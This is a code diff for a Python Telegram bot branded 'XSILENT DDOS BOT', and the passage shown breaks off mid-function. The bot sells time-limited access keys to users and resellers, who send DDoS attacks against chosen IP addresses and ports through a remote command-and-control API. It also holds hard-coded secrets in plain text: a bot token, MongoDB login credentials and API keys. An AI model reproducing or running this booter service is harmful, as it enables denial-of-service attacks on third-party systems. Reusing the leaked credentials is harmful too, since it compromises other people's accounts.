@@ -1,1607 +1,1181 @@
-import asyncio
-import logging
-from datetime import datetime, timedelta, timezone
-from typing import Dict, Optional, List
+#!/usr/bin/env python3
+import telebot
 import requests
-from telegram import Update
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    ContextTypes
-)
-import pymongo
-from pymongo import MongoClient, ASCENDING, DESCENDING
-from functools import wraps
-import uuid
+import time
+import threading
+import json
 import os
+import random
+import string
 import re
-from dotenv import load_dotenv
+from datetime import datetime, timedelta
+from collections import defaultdict
+from pymongo import MongoClient
 
-# Configure logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# ========== CONFIG ==========
+BOT_TOKEN = "8291785662:AAE49V61h5jILkH7Fk_rL8haaAgHwLcY6wE"
+ADMIN_ID = ["8487946379"]
+API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
+API_KEY = "WkhgMWL"
+MAX_CONCURRENT = 2
 
-load_dotenv()
+# ========== MONGODB CONNECTION ==========
+MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
+client = MongoClient(MONGO_URI)
+db = client["xsilent_bot"]
+users_collection = db["users"]
+keys_collection = db["keys"]
+groups_collection = db["groups"]
+settings_collection = db["settings"]
+blocked_users_collection = db["blocked_users"]
 
-# ==================== CONFIGURATION ====================
-BOT_TOKEN = os.getenv("8291785662:AAE4N2cxu1TqLr8xRv-zX2wGWvECNaTq400")
-MONGODB_URI = os.getenv("mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER")
-DATABASE_NAME = os.getenv("XSilent_bot", "attack_bot")
-API_URL = os.getenv("http://cnc.teamc2.xyz:5001/api/attack")
-API_KEY = os.getenv("PFC10J")
-ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "8487946379").split(",")]
+# ========== DATA STRUCTURES ==========
+active_attacks = {}
+cooldown = {}
+group_attack_times = {}
 
-# Blocked ports
-BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
-MIN_PORT = 1
-MAX_PORT = 65535
+# ========== LOAD DATA FROM MONGODB ==========
+def load_users():
+    users_data = users_collection.find_one({"_id": "users"})
+    if not users_data:
+        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
+        return {"users": [ADMIN_ID[0]], "resellers": []}
+    return users_data
 
-# ==================== HELPER FUNCTIONS ====================
-def make_aware(dt):
-    if dt is None:
-        return None
-    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
-        return dt.replace(tzinfo=timezone.utc)
-    return dt
+def load_keys():
+    keys = {}
+    for key_data in keys_collection.find():
+        keys[key_data["key"]] = {
+            "user_id": key_data.get("user_id"),
+            "duration_value": key_data.get("duration_value"),
+            "duration_unit": key_data.get("duration_unit"),
+            "generated_by": key_data.get("generated_by"),
+            "generated_at": key_data.get("generated_at"),
+            "expires_at": key_data.get("expires_at"),
+            "used": key_data.get("used", False),
+            "used_by": key_data.get("used_by"),
+            "used_at": key_data.get("used_at")
+        }
+    return keys
 
-def get_current_time():
-    return datetime.now(timezone.utc)
+def save_users(data):
+    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)
 
-def escape_markdown(text: str) -> str:
-    if not text:
-        return ""
-    special_chars = r'_*[]()~`>#+-=|{}.!'
-    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))
+def save_keys(keys_data):
+    keys_collection.delete_many({})
+    for key, info in keys_data.items():
+        keys_collection.insert_one({
+            "key": key,
+            "user_id": info.get("user_id"),
+            "duration_value": info.get("duration_value"),
+            "duration_unit": info.get("duration_unit"),
+            "generated_by": info.get("generated_by"),
+            "generated_at": info.get("generated_at"),
+            "expires_at": info.get("expires_at"),
+            "used": info.get("used", False),
+            "used_by": info.get("used_by"),
+            "used_at": info.get("used_at")
+        })
 
-def parse_duration(duration_str: str) -> tuple:
-    """
-    Parse duration string like '24h', '7d', '2w', '30'
-    Returns (days, hours, total_hours, display_string)
-    """
-    duration_str = duration_str.lower().strip()
-    
-    # Check for hours
-    if duration_str.endswith('h'):
-        hours = int(duration_str[:-1])
-        if 1 <= hours <= 168:
-            return (0, hours, hours, f"{hours} hour(s)")
-    
-    # Check for days
-    if duration_str.endswith('d'):
-        days = int(duration_str[:-1])
-        if 1 <= days <= 365:
-            return (days, 0, days * 24, f"{days} day(s)")
-    
-    # Check for weeks
-    if duration_str.endswith('w'):
-        weeks = int(duration_str[:-1])
-        if 1 <= weeks <= 52:
-            days = weeks * 7
-            return (days, 0, days * 24, f"{weeks} week(s)")
-    
-    # Plain number as days
-    try:
-        days = int(duration_str)
-        if 1 <= days <= 365:
-            return (days, 0, days * 24, f"{days} day(s)")
-    except:
-        pass
-    
+def load_groups():
+    groups = {}
+    for group_data in groups_collection.find():
+        groups[group_data["group_id"]] = {
+            "attack_time": group_data.get("attack_time", 60),
+            "added_by": group_data.get("added_by"),
+            "added_at": group_data.get("added_at")
+        }
+    return groups
+
+def save_group(group_id, attack_time, added_by):
+    groups_collection.update_one(
+        {"group_id": group_id},
+        {"$set": {
+            "attack_time": attack_time,
+            "added_by": added_by,
+            "added_at": time.time()
+        }},
+        upsert=True
+    )
+
+def remove_group(group_id):
+    groups_collection.delete_one({"group_id": group_id})
+
+def get_group_attack_time(group_id):
+    group = groups_collection.find_one({"group_id": group_id})
+    if group:
+        return group.get("attack_time", 60)
     return None
 
-# ==================== DATABASE CLASS ====================
-class Database:
-    def __init__(self):
-        self.client = MongoClient(MONGODB_URI)
-        self.db = self.client[DATABASE_NAME]
-        self.users = self.db.users
-        self.attacks = self.db.attacks
-        self.keys = self.db.keys
-        self.resellers = self.db.resellers
-        self.groups = self.db.groups
-        self.settings = self.db.settings
-        self.blocked_users = self.db.blocked_users
-        self.hosted_bots = self.db.hosted_bots
-        
-        # Cleanup
-        try:
-            self.users.delete_many({"user_id": None})
-            self.users.delete_many({"user_id": {"$exists": False}})
-        except:
-            pass
-        
-        # Create indexes
-        try:
-            self.users.drop_indexes()
-            self.attacks.drop_indexes()
-            self.keys.drop_indexes()
-        except:
-            pass
-        
-        self.attacks.create_index([("timestamp", DESCENDING)])
-        self.attacks.create_index([("user_id", ASCENDING)])
-        self.users.create_index([("user_id", ASCENDING)], unique=True)
-        self.keys.create_index([("key", ASCENDING)], unique=True)
-        self.resellers.create_index([("user_id", ASCENDING)], unique=True)
-        self.groups.create_index([("group_id", ASCENDING)], unique=True)
-        self.blocked_users.create_index([("user_id", ASCENDING)], unique=True)
-        
-        # Initialize default concurrent limit
-        if not self.settings.find_one({"_id": "concurrent_limit"}):
-            self.settings.insert_one({"_id": "concurrent_limit", "value": 2})
-    
-    # ========== USER METHODS ==========
-    def get_user(self, user_id: int) -> Optional[Dict]:
-        user = self.users.find_one({"user_id": user_id})
-        if user:
-            if user.get("created_at"):
-                user["created_at"] = make_aware(user["created_at"])
-            if user.get("approved_at"):
-                user["approved_at"] = make_aware(user["approved_at"])
-            if user.get("expires_at"):
-                user["expires_at"] = make_aware(user["expires_at"])
-        return user
-    
-    def create_user(self, user_id: int, username: str = None, first_name: str = None) -> Dict:
-        existing_user = self.get_user(user_id)
-        if existing_user:
-            return existing_user
-            
-        user_data = {
-            "user_id": user_id,
-            "username": username,
-            "first_name": first_name,
-            "approved": False,
-            "approved_at": None,
-            "expires_at": None,
-            "total_attacks": 0,
-            "created_at": get_current_time(),
-            "is_banned": False
+# Blocked users functions
+def load_blocked_users():
+    blocked_users = {}
+    for blocked_data in blocked_users_collection.find():
+        blocked_users[blocked_data["user_id"]] = {
+            "blocked_by": blocked_data.get("blocked_by"),
+            "blocked_at": blocked_data.get("blocked_at"),
+            "reason": blocked_data.get("reason", "No reason provided")
         }
-        try:
-            self.users.insert_one(user_data)
-            logger.info(f"Created new user: {user_id}")
-        except pymongo.errors.DuplicateKeyError:
-            user_data = self.get_user(user_id)
-        return user_data
+    return blocked_users
+
+def save_blocked_user(user_id, blocked_by, reason="No reason provided"):
+    blocked_users_collection.update_one(
+        {"user_id": user_id},
+        {"$set": {
+            "user_id": user_id,
+            "blocked_by": blocked_by,
+            "blocked_at": time.time(),
+            "reason": reason
+        }},
+        upsert=True
+    )
+
+def remove_blocked_user(user_id):
+    blocked_users_collection.delete_one({"user_id": user_id})
+
+def is_user_blocked(user_id):
+    return blocked_users_collection.find_one({"user_id": user_id}) is not None
+
+users_data = load_users()
+users = users_data["users"]
+resellers = users_data.get("resellers", [])
+keys_data = load_keys()
+groups = load_groups()
+blocked_users = load_blocked_users()
+
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# ========== HELPER FUNCTIONS ==========
+def generate_key():
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
+
+def parse_duration(duration_str):
+    duration_str = duration_str.lower().strip()
     
-    def approve_user(self, user_id: int, days: int = 0, hours: int = 0) -> bool:
-        total_days = days + (hours / 24)
-        expires_at = get_current_time() + timedelta(days=total_days)
-        result = self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
-        )
-        return result.modified_count > 0
+    if duration_str.isdigit():
+        return int(duration_str), "day"
     
-    def disapprove_user(self, user_id: int) -> bool:
-        result = self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": False, "expires_at": None}}
-        )
-        return result.modified_count > 0
+    if duration_str.endswith('h'):
+        hours = duration_str.replace('h', '')
+        if hours.isdigit():
+            return int(hours), "hour"
     
-    # ========== BLOCKED USERS ==========
-    def block_user(self, user_id: int) -> bool:
-        try:
-            self.blocked_users.insert_one({"user_id": user_id, "blocked_at": get_current_time()})
-            return True
-        except:
-            return False
+    return None, None
+
+def get_expiry_date(value, unit):
+    if unit == "hour":
+        return datetime.now() + timedelta(hours=value)
+    else:
+        return datetime.now() + timedelta(days=value)
+
+def format_duration(value, unit):
+    if unit == "hour":
+        return str(value) + " Hour(s)"
+    else:
+        return str(value) + " Day(s)"
+
+def check_total_active_attacks():
+    now = time.time()
+    count = 0
+    for attack_id, info in list(active_attacks.items()):
+        if now < info["finish_time"]:
+            count += 1
+        else:
+            del active_attacks[attack_id]
+    return count
+
+def check_active_attack_by_target(ip, port):
+    target_key = ip + ":" + str(port)
+    now = time.time()
+    for attack_id, attack_info in list(active_attacks.items()):
+        if attack_info["target_key"] == target_key:
+            if now < attack_info["finish_time"]:
+                return attack_info
+            else:
+                del active_attacks[attack_id]
+                return None
+    return None
+
+def format_attack_status():
+    now = time.time()
+    slot1_free = True
+    slot2_free = True
+    slot1_info = None
+    slot2_info = None
     
-    def unblock_user(self, user_id: int) -> bool:
-        result = self.blocked_users.delete_one({"user_id": user_id})
-        return result.deleted_count > 0
-    
-    def is_user_blocked(self, user_id: int) -> bool:
-        return self.blocked_users.find_one({"user_id": user_id}) is not None
-    
-    def get_blocked_users(self) -> List[Dict]:
-        return list(self.blocked_users.find())
-    
-    # ========== HOSTED BOTS ==========
-    def add_hosted_bot(self, bot_token: str, owner_id: int, bot_name: str, added_by: int) -> bool:
-        try:
-            self.hosted_bots.insert_one({
-                "bot_token": bot_token,
-                "owner_id": owner_id,
-                "bot_name": bot_name,
-                "added_by": added_by,
-                "added_at": get_current_time(),
-                "is_blocked": False
+    slots = []
+    for attack_id, info in active_attacks.items():
+        if now < info["finish_time"]:
+            remaining = int(info["finish_time"] - now)
+            slots.append({
+                "target": info["target_key"],
+                "user": info["user"],
+                "remaining": remaining
             })
-            return True
-        except:
-            return False
     
-    def remove_hosted_bot(self, bot_token: str) -> bool:
-        result = self.hosted_bots.delete_one({"bot_token": bot_token})
-        return result.deleted_count > 0
+    if len(slots) >= 1:
+        slot1_free = False
+        slot1_info = "🎯 " + slots[0]["target"] + "\n   👤 " + slots[0]["user"] + "\n   ⏰ " + str(slots[0]["remaining"]) + "s left"
     
-    def block_hosted_bot(self, bot_token: str) -> bool:
-        result = self.hosted_bots.update_one({"bot_token": bot_token}, {"$set": {"is_blocked": True}})
-        return result.modified_count > 0
+    if len(slots) >= 2:
+        slot2_free = False
+        slot2_info = "🎯 " + slots[1]["target"] + "\n   👤 " + slots[1]["user"] + "\n   ⏰ " + str(slots[1]["remaining"]) + "s left"
     
-    def unblock_hosted_bot(self, bot_token: str) -> bool:
-        result = self.hosted_bots.update_one({"bot_token": bot_token}, {"$set": {"is_blocked": False}})
-        return result.modified_count > 0
-    
-    def get_hosted_bots(self) -> List[Dict]:
-        return list(self.hosted_bots.find())
-    
-    def is_hosted_bot_blocked(self, bot_token: str) -> bool:
-        bot = self.hosted_bots.find_one({"bot_token": bot_token})
-        return bot.get("is_blocked", False) if bot else False
-    
-    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
-        attack_data = {
-            "_id": str(uuid.uuid4()),
-            "user_id": user_id,
-            "ip": ip,
-            "port": port,
-            "duration": duration,
-            "status": status,
-            "response": response[:500] if response else None,
-            "timestamp": get_current_time()
-        }
-        try:
-            self.attacks.insert_one(attack_data)
-            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
-        except Exception as e:
-            logger.error(f"Failed to log attack: {e}")
-    
-    def get_all_users(self) -> List[Dict]:
-        users = list(self.users.find({"user_id": {"$ne": None}}))
-        for user in users:
-            if user.get("created_at"):
-                user["created_at"] = make_aware(user["created_at"])
-            if user.get("expires_at"):
-                user["expires_at"] = make_aware(user["expires_at"])
-            if "total_attacks" not in user:
-                user["total_attacks"] = 0
-        return users
-    
-    def get_user_attack_stats(self, user_id: int) -> Dict:
-        total = self.attacks.count_documents({"user_id": user_id})
-        successful = self.attacks.count_documents({"user_id": user_id, "status": "success"})
-        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
-        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
-        for attack in recent:
-            if attack.get("timestamp"):
-                attack["timestamp"] = make_aware(attack["timestamp"])
-        return {"total": total, "successful": successful, "failed": failed, "recent": recent}
-    
-    def get_bot_stats(self) -> Dict:
-        total_users = self.users.count_documents({})
-        approved_users = self.users.count_documents({"approved": True})
-        total_attacks = self.attacks.count_documents({})
-        today = get_current_time().replace(hour=0, minute=0, second=0, microsecond=0)
-        today_attacks = self.attacks.count_documents({"timestamp": {"$gte": today}})
-        return {
-            "total_users": total_users,
-            "approved_users": approved_users,
-            "total_attacks": total_attacks,
-            "today_attacks": today_attacks
-        }
-    
-    # ========== KEY METHODS ==========
-    def generate_key(self, created_by: int, days: int = 0, hours: int = 0, duration_display: str = "") -> str:
-        key = str(uuid.uuid4())[:8].upper()
-        total_days = days + (hours / 24)
-        key_data = {
-            "key": key,
-            "days": total_days,
-            "hours": hours,
-            "days_count": days,
-            "duration_display": duration_display,
-            "created_by": created_by,
-            "created_at": get_current_time(),
-            "used_by": None,
-            "used_at": None,
-            "is_used": False,
-            "expires_at": get_current_time() + timedelta(days=total_days) if total_days > 0 else None
-        }
-        self.keys.insert_one(key_data)
-        return key
-    
-    def redeem_key(self, key: str, user_id: int) -> tuple:
-        """Returns (success, message, days, hours)"""
-        key_data = self.keys.find_one({"key": key.upper(), "is_used": False})
-        if not key_data:
-            return (False, "Invalid or already used key.", 0, 0)
-        
-        # Check if key expired
-        expires_at = key_data.get("expires_at")
-        if expires_at and make_aware(expires_at) < get_current_time():
-            self.keys.delete_one({"key": key.upper()})
-            return (False, "Key has expired.", 0, 0)
-        
-        days = key_data.get("days_count", 0)
-        hours = key_data.get("hours", 0)
-        
-        # Approve user
-        self.approve_user(user_id, days=days, hours=hours)
-        
-        # Mark key as used
-        self.keys.update_one(
-            {"key": key.upper()}, 
-            {"$set": {"is_used": True, "used_by": user_id, "used_at": get_current_time()}}
-        )
-        return (True, f"Key redeemed! Access for {key_data.get('duration_display', f'{days}d {hours}h')}", days, hours)
-    
-    def get_keys(self, created_by: int = None) -> List[Dict]:
-        if created_by:
-            return list(self.keys.find({"created_by": created_by}).sort("created_at", -1))
-        return list(self.keys.find().sort("created_at", -1))
-    
-    def delete_key(self, key: str) -> bool:
-        result = self.keys.delete_one({"key": key.upper()})
-        return result.deleted_count > 0
-    
-    def cleanup_expired_keys(self):
-        """Delete expired keys"""
-        now = get_current_time()
-        result = self.keys.delete_many({"expires_at": {"$lt": now}, "is_used": False})
-        if result.deleted_count > 0:
-            logger.info(f"Deleted {result.deleted_count} expired keys")
-    
-    def cleanup_expired_users(self):
-        """Disapprove expired users"""
-        now = get_current_time()
-        result = self.users.update_many(
-            {"approved": True, "expires_at": {"$lt": now}},
-            {"$set": {"approved": False, "expires_at": None}}
-        )
-        if result.modified_count > 0:
-            logger.info(f"Disabled {result.modified_count} expired users")
-    
-    # ========== RESELLER METHODS ==========
-    def add_reseller(self, user_id: int, added_by: int) -> bool:
-        try:
-            self.resellers.insert_one({"user_id": user_id, "added_by": added_by, "added_at": get_current_time()})
-            return True
-        except:
-            return False
-    
-    def remove_reseller(self, user_id: int) -> bool:
-        result = self.resellers.delete_one({"user_id": user_id})
-        return result.deleted_count > 0
-    
-    def is_reseller(self, user_id: int) -> bool:
-        return self.resellers.find_one({"user_id": user_id}) is not None
-    
-    def get_resellers(self) -> List[Dict]:
-        return list(self.resellers.find())
-    
-    # ========== GROUP METHODS ==========
-    def add_allowed_group(self, group_id: int, group_name: str = None) -> bool:
-        try:
-            self.groups.insert_one({"group_id": group_id, "name": group_name, "added_at": get_current_time()})
-            return True
-        except:
-            return False
-    
-    def remove_allowed_group(self, group_id: int) -> bool:
-        result = self.groups.delete_one({"group_id": group_id})
-        return result.deleted_count > 0
-    
-    def is_group_allowed(self, group_id: int) -> bool:
-        return self.groups.find_one({"group_id": group_id}) is not None
-    
-    def get_groups(self) -> List[Dict]:
-        return list(self.groups.find())
-    
-    # ========== CONCURRENT LIMIT METHODS ==========
-    def set_concurrent_limit(self, limit: int) -> bool:
-        self.settings.update_one({"_id": "concurrent_limit"}, {"$set": {"value": limit}}, upsert=True)
-        return True
-    
-    def get_concurrent_limit(self) -> int:
-        setting = self.settings.find_one({"_id": "concurrent_limit"})
-        return setting.get("value", 2) if setting else 2
+    return slot1_free, slot2_free, slot1_info, slot2_info
 
-# Initialize database
-print("🔄 Initializing database...")
-db = Database()
-print("✅ Database ready!")
-
-# ==================== API FUNCTIONS ====================
-def check_api_health() -> Dict:
-    try:
-        response = requests.get(f"{API_URL}/api/v1/health", headers={"x-api-key": API_KEY}, timeout=10)
-        if response.status_code == 200:
-            return response.json()
-        return {"status": "error", "error": f"HTTP {response.status_code}"}
-    except Exception as e:
-        return {"status": "error", "error": str(e)}
-
-def check_running_attacks() -> Dict:
-    try:
-        response = requests.get(f"{API_URL}/api/v1/active", headers={"x-api-key": API_KEY}, timeout=10)
-        if response.status_code == 200:
-            return response.json()
-        return {"success": False, "error": f"HTTP {response.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def get_api_stats() -> Dict:
-    try:
-        response = requests.get(f"{API_URL}/api/v1/stats", headers={"x-api-key": API_KEY}, timeout=10)
-        if response.status_code == 200:
-            return response.json()
-        return {"success": False, "error": f"HTTP {response.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def launch_attack(ip: str, port: int, duration: int) -> Dict:
-    try:
-        response = requests.post(
-            f"{API_URL}/api/v1/attack",
-            json={"ip": ip, "port": port, "duration": duration},
-            headers={"x-api-key": API_KEY},
-            timeout=15
-        )
-        return response.json()
-    except Exception as e:
-        return {"error": str(e), "success": False}
-
-# ==================== DECORATORS ====================
-def admin_required(func):
-    @wraps(func)
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command.")
-            return
-        return await func(update, context, *args, **kwargs)
-    return wrapper
-
-def reseller_or_admin_required(func):
-    @wraps(func)
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS and not db.is_reseller(user_id):
-            await update.message.reply_text("❌ Reseller or Admin access required.")
-            return
-        return await func(update, context, *args, **kwargs)
-    return wrapper
-
-async def is_user_approved(user_id: int) -> bool:
-    # Check if user is blocked
-    if db.is_user_blocked(user_id):
-        return False
+def remove_user_from_system(user_id):
+    if user_id in users:
+        users.remove(user_id)
+    if user_id in resellers:
+        resellers.remove(user_id)
+    users_data["users"] = users
+    users_data["resellers"] = resellers
+    save_users(users_data)
     
-    user = db.get_user(user_id)
-    if not user or not user.get("approved", False):
-        return False
-    expires_at = user.get("expires_at")
-    if expires_at:
-        expires_at = make_aware(expires_at)
-        if expires_at < get_current_time():
-            return False
+    for attack_id in list(active_attacks.keys()):
+        if active_attacks[attack_id]["user"] == user_id:
+            del active_attacks[attack_id]
+    
+    if user_id in cooldown:
+        del cooldown[user_id]
+    
     return True
 
-def is_port_blocked(port: int) -> bool:
-    return port in BLOCKED_PORTS
+def check_user_expiry(user_id):
+    now = time.time()
+    for key, info in keys_data.items():
+        if info.get("used_by") == user_id and info.get("used") == True:
+            if now < info["expires_at"]:
+                return True
+    return False
 
-def get_blocked_ports_list() -> str:
-    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
+def is_user_in_approved_group(user_id):
+    for group_id, group_info in groups.items():
+        try:
+            member = bot.get_chat_member(group_id, user_id)
+            if member.status in ["member", "administrator", "creator"]:
+                return group_id
+        except:
+            continue
+    return None
 
-# ==================== BACKGROUND TASKS ====================
-async def check_attack_completion(context: ContextTypes.DEFAULT_TYPE):
-    """Check for completed attacks and notify users"""
-    if not hasattr(context.bot_data, 'active_attacks'):
-        context.bot_data['active_attacks'] = {}
-    
-    now = get_current_time()
-    completed = []
-    
-    for user_id, attack in list(context.bot_data['active_attacks'].items()):
-        if attack['end_time'] <= now:
-            try:
-                await context.bot.send_message(
-                    user_id,
-                    f"✅ Your attack on `{attack['ip']}:{attack['port']}` has completed.\n"
-                    f"⏱️ Duration: {attack['duration']} seconds",
-                    parse_mode='MarkdownV2'
-                )
-            except Exception as e:
-                logger.error(f"Completion message error: {e}")
-            completed.append(user_id)
-    
-    for user_id in completed:
-        del context.bot_data['active_attacks'][user_id]
-
-async def cleanup_expired(context: ContextTypes.DEFAULT_TYPE):
-    """Cleanup expired keys and users"""
-    db.cleanup_expired_keys()
-    db.cleanup_expired_users()
-
-# ==================== USER COMMANDS ====================
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    chat = update.effective_chat
+# ========== COMMANDS ==========
+@bot.message_handler(commands=['start'])
+def start(msg):
+    uid = str(msg.chat.id)
+    chat_type = msg.chat.type
     
     # Check if user is blocked
-    if db.is_user_blocked(user.id):
-        await update.message.reply_text("🚫 **You are blocked from using this bot!**\n\nContact admin for assistance.", parse_mode='MarkdownV2')
+    if is_user_blocked(uid):
+        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
         return
     
-    # Check if group and allowed
-    if chat.type in ["group", "supergroup"]:
-        if not db.is_group_allowed(chat.id):
-            await update.message.reply_text("❌ This group is not allowed to use this bot.")
-            return
-    
-    db.create_user(user.id, user.username, user.first_name)
-    
-    await update.message.reply_text(
-        f"🚀 **Welcome {escape_markdown(user.first_name)}!**\n\n"
-        f"**XSILENT Attack Bot**\n\n"
-        f"💀 Powerful DDoS Attack Bot\n"
-        f"🔒 Secure & Fast\n\n"
-        f"Use `/help` to see available commands.\n"
-        f"Use `/redeem <key>` to activate your access.\n\n"
-        f"📌 **Note:** This bot is for authorized use only.",
-        parse_mode='MarkdownV2'
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
-    is_reseller = db.is_reseller(user_id)
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
+    if chat_type == "group" or chat_type == "supergroup":
+        group_id = str(msg.chat.id)
+        attack_time = get_group_attack_time(group_id)
+        if attack_time:
+            bot.reply_to(msg, "🔥 XSILENT DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: " + str(attack_time) + "s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
+        else:
+            bot.reply_to(msg, "❌ Group not approved! Contact owner to add this group.")
         return
     
-    help_text = """🤖 **XSILENT Bot Commands**
-
-━━━━━━━━━━━━━━━━━━━
-📌 **User Commands**
-━━━━━━━━━━━━━━━━━━━
-/start - Start the bot
-/help - Show this menu
-/redeem `<key>` - Redeem activation key
-/attack `<ip>` `<port>` `<duration>` - Launch attack
-/myattacks - Check your active attacks
-/myinfo - View account info
-/mystats - Attack statistics
-/blockedports - Show blocked ports
-/status - Check active attack with timer
-
-"""
-    
-    if is_reseller:
-        help_text += """
-━━━━━━━━━━━━━━━━━━━
-💎 **Reseller Commands**
-━━━━━━━━━━━━━━━━━━━
-/genkey `<1-168h|1-365d|1-52w>` - Generate key
-/keys - View your generated keys
-/approveuser `<id>` `<days>` - Approve user
-
-"""
-    
-    if is_admin:
-        help_text += """
-━━━━━━━━━━━━━━━━━━━
-👑 **Admin Commands**
-━━━━━━━━━━━━━━━━━━━
-/approve `<id>` `<days>` - Approve user
-/disapprove `<id>` - Disapprove user
-/delkey `<key>` - Delete a key
-/keys `all` - View all keys
-/addreseller `<id>` - Add reseller
-/removereseller `<id>` - Remove reseller
-/resellers - List all resellers
-/addgroup `<id>` `[name]` - Add allowed group
-/removegroup `<id>` - Remove group
-/groups - List allowed groups
-/users - List all users
-/api_status - API health
-/running - Running attacks
-/stats - Bot statistics
-/blockedports - Blocked ports
-/set_concurrent `<1-300>` - Set concurrent limit
-
-━━━━━━━━━━━━━━━━━━━
-🚫 **Block Commands**
-━━━━━━━━━━━━━━━━━━━
-/block `<user_id>` - Block a user
-/unblock `<user_id>` - Unblock a user
-/allblocks - List blocked users
-
-━━━━━━━━━━━━━━━━━━━
-🤖 **Host Bot Commands**
-━━━━━━━━━━━━━━━━━━━
-/host `<token>` `<owner_id>` `<name>` - Host a bot
-/unhost `<token>` - Remove hosted bot
-/blockhost `<token>` - Block hosted bot
-/unblockhost `<token>` - Unblock hosted bot
-/allhosts - List all hosted bots
-
-"""
-    
-    await update.message.reply_text(help_text, parse_mode='MarkdownV2')
-
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text(
-            "❌ **Usage:** `/redeem <key>`\n\n"
-            "Example: `/redeem ABC12345`",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    key = context.args[0]
-    success, message, days, hours = db.redeem_key(key, user_id)
-    
-    if success:
-        await update.message.reply_text(
-            f"✅ **{message}**\n\n"
-            f"📅 You can now use the bot.\n"
-            f"Use `/help` to see commands.",
-            parse_mode='MarkdownV2'
-        )
+    if uid in ADMIN_ID:
+        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status\n/block USER_ID REASON\n/unblock USER_ID\n/blockedlist")
+    elif uid in resellers:
+        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
+    elif uid in users:
+        has_active = check_user_expiry(uid)
+        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - USER\n\n✅ Status: " + ("Active" if has_active else "Expired") + "\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/redeem KEY")
     else:
-        await update.message.reply_text(
-            f"❌ **{message}**\n\n"
-            f"Please check the key and try again.",
-            parse_mode='MarkdownV2'
-        )
+        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")
 
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+@bot.message_handler(commands=['host'])
+def host_command(msg):
+    """Command to block bot host commands"""
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split(maxsplit=1)
+    if len(args) != 2:
+        bot.reply_to(msg, "📝 Usage: /host <command>\n\nExample: /host /start\n\nThis will block the command on the bot host.")
+        return
+    
+    command_to_block = args[1].strip()
+    
+    # Save blocked command to database
+    blocked_commands = settings_collection.find_one({"_id": "blocked_commands"})
+    if not blocked_commands:
+        blocked_commands = {"_id": "blocked_commands", "commands": []}
+    
+    if command_to_block not in blocked_commands["commands"]:
+        blocked_commands["commands"].append(command_to_block)
+        settings_collection.update_one(
+            {"_id": "blocked_commands"},
+            {"$set": {"commands": blocked_commands["commands"]}},
+            upsert=True
+        )
+        bot.reply_to(msg, f"✅ Command '{command_to_block}' has been blocked on the bot host!\n\nAnyone trying to use this command will see: 🚫 BLOCKED BOT")
+    else:
